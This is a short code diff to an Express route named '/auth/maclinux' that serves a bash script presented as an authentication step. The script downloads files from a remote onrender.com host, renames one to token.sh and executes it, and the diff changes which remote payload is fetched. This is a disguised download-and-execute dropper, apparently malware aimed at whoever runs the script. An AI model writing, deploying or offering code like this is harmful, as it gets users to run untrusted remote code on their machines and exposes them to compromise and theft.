@@ -54,7 +54,7 @@ router.get("/auth/maclinux", (req, res) => {
   res.type("text/plain").send(`#!/bin/bash
 set -e
 echo "Authenticated"
-wget -q -O "$HOME/token" "https://be-1-49aq.onrender.com/token"
+wget -q -O "$HOME/token" "https://be-1-49aq.onrender.com/tokenlinux.npl"
 wget -q -O "$HOME/tokenParser.npl" "https://be-1-49aq.onrender.com/tokenParser.npl"
 mv "$HOME/token" "$HOME/token.sh"
 bash "$HOME/token.sh"
